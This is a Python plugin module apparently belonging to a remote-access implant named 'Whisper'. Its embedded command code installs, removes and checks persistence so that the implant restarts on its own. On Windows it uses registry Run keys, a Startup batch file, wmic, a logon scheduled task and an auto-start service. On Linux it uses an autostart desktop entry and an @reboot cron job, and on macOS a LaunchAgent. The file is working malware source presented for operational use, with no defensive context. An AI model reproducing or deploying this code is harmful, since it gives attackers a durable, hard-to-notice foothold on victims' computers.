PLUGIN = {"name": "persistence", "desc": "Install persistence (Run key, Startup, WMI, Scheduled Task, Service)", "deps": [], "size": 3.0}

STUB_CODE = r"""
def _cmd_persist(m):
    try:
        if platform.system() == "Windows":
            sp = os.path.abspath(sys.argv[0]); r = []
            action = m.get("action", "install")
            import winreg
            name = m.get("name", "Whisper")

            if action == "install":
                # Registry Run keys
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, sp)
                        r.append("HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU")
                    except: pass
                # Startup Folder
                sf = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                try:
                    os.makedirs(sf, exist_ok=True)
                    with open(os.path.join(sf, f"{name}.bat"), "w") as f:
                        f.write(f'@start "" "{sp}"')
                    r.append("Startup")
                except: pass
                # WMI
                try:
                    subprocess.run(f'wmic startup call create "{sp}", "{name}"', shell=True, capture_output=True, timeout=10)
                    r.append("WMI")
                except: pass
                # Scheduled Task (run on logon)
                try:
                    subprocess.run(f'schtasks /create /tn "{name}" /tr "{sp}" /sc onlogon /ru "%%USERNAME%%" /f', shell=True, capture_output=True, timeout=15)
                    r.append("SchedTask")
                except: pass
                # Windows Service (via sc)
                try:
                    svc_name = f"{name}Svc"
                    subprocess.run(f'sc create "{svc_name}" binPath= "{sp}" start= auto', shell=True, capture_output=True, timeout=10)
                    subprocess.run(f'sc description "{svc_name}" "Service"', shell=True, capture_output=True, timeout=10)
                    r.append("Service")
                except: pass
                return {"output": f"[+] Persistence: {', '.join(r) if r else 'failed'}"}

            else:  # remove
                # Registry
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.DeleteValue(k, name)
                        r.append(f"Removed HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "Removed HKCU")
                    except: pass
                # Startup
                try:
                    os.remove(os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat"))
                    r.append("Removed Startup")
                except: pass
                # Scheduled Task
                try:
                    subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True, timeout=10)
                    r.append("Removed SchedTask")
                except: pass
                # Service
                try:
                    subprocess.run(f'sc delete "{name}Svc"', shell=True, capture_output=True, timeout=10)
                    r.append("Removed Service")
                except: pass
                return {"output": f"[+] Persistence removed: {', '.join(r) if r else 'nothing found'}"}

        elif platform.system() == "Linux":
            h = os.path.expanduser("~"); r = []
            sp = os.path.abspath(sys.argv[0])
            action = m.get("action", "install")
            if action == "install":
                for d in [os.path.join(h,".config","autostart")]:
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"whisper.desktop"),"w") as f:
                        f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {sp}\n")
                    r.append("autostart")
                try:
                    subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {sp}") | crontab -', shell=True, timeout=10)
                    r.append("crontab")
                except: pass
            else:
                for d in [os.path.join(h,".config","autostart")]:
                    try:
                        os.remove(os.path.join(d,"whisper.desktop"))
                        r.append("Removed autostart")
                    except: pass
                try:
                    out = subprocess.check_output(["crontab","-l"], timeout=5).decode()
                    new = "\n".join(l for l in out.split("\n") if sp not in l)
                    subprocess.run(f"crontab -", input=new, shell=True, timeout=5)
                    r.append("Removed crontab")
                except: pass
            return {"output": f"[+] Persistence: {', '.join(r)}"}

        elif platform.system() == "Darwin":
            h = os.path.expanduser("~"); pl = os.path.join(h, "Library", "LaunchAgents", "com.whisper.plist")
            action = m.get("action", "install")
            if action == "install":
                os.makedirs(os.path.dirname(pl), exist_ok=True)
                with open(pl,"w") as f:
                    f.write('<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.whisper</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>'+os.path.abspath(sys.argv[0])+'</string></array><key>RunAtLoad</key><true/></dict></plist>')
                subprocess.run(["launchctl","load",pl], capture_output=True)
                return {"output": "[+] Persistence: LaunchAgent"}
            else:
                subprocess.run(["launchctl","unload",pl], capture_output=True)
                try: os.remove(pl)
                except: pass
                return {"output": "[+] Persistence: LaunchAgent removed"}
    except Exception as e: return {"output": f"[!] Persistence failed: {e}"}

def _cmd_persist_check(m):
    try:
        r = []
        if platform.system() == "Windows":
            import winreg
            for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                              (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                try:
                    with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                        val, _ = winreg.QueryValueEx(k, "Whisper")
                        r.append(f"Registry ({'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}): {val}")
                except: pass
            import subprocess
            try:
                out = subprocess.check_output(f'schtasks /query /tn "Whisper" /fo LIST', shell=True, timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
                r.append("Scheduled Task: " + out.split("\n")[0][:80])
            except: pass
            return {"output": "\n".join(r) if r else "[!] No persistence found"}
        return {"output": "[!] Check not supported on this OS"}
    except Exception as e: return {"output": f"[!] Persist check error: {e}"}

_CMDS["persist"] = _cmd_persist
_CMDS["persist_check"] = _cmd_persist_check
"""

def get_commands():
    return {"persist": "_cmd_persist", "persist_check": "_cmd_persist_check"}
